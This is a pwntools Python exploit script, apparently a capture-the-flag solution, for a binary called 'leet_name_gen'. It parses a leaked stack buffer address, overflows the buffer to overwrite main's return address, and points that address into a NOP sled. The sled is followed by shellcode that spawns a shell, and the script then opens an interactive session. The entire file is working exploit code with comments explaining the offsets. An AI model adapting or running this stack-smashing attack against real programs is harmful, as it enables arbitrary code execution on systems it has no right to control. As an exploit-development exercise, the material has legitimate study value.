#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template sum
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('leet_name_gen')
context.terminal = "terminator -x".split()

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

msg = io.recvuntil("License code")
print(msg)
leakline = io.recvline()
leakline = leakline.rstrip()
leakline = leakline.rstrip(']')
buf_addr = int(leakline)
print("buffer@%x" % buf_addr)

# For this binary, the return address (from main to
# libc_start_main) is 72 bytes ahead of the start of
# the vulnerable buffer (observed with GDB).
bytes_to_ret_addr = 72
nop_sled_size = 128
# Compute a new return address so that it points in the middle
# of the NOP sled.
ret_addr = buf_addr + bytes_to_ret_addr + 8 + nop_sled_size / 2

# Fill arbritrary characters in "char buffer[0x32]", up to
# the stack location immediately before the return address
# (return from main to libc_start_main), but also insert a
# string terminator to make sure that the generate_l33t_name()
# function does not corrupt the stack.
vector = cyclic(bytes_to_ret_addr/2)
vector += '\00' * (bytes_to_ret_addr/2)
vector += p64(ret_addr)
vector += asm("nop") * nop_sled_size
vector += asm(shellcraft.sh())
io.sendline(vector)

# Append the return address (in little endian)
# Switch to interactive mode to use the shell.
io.interactive()
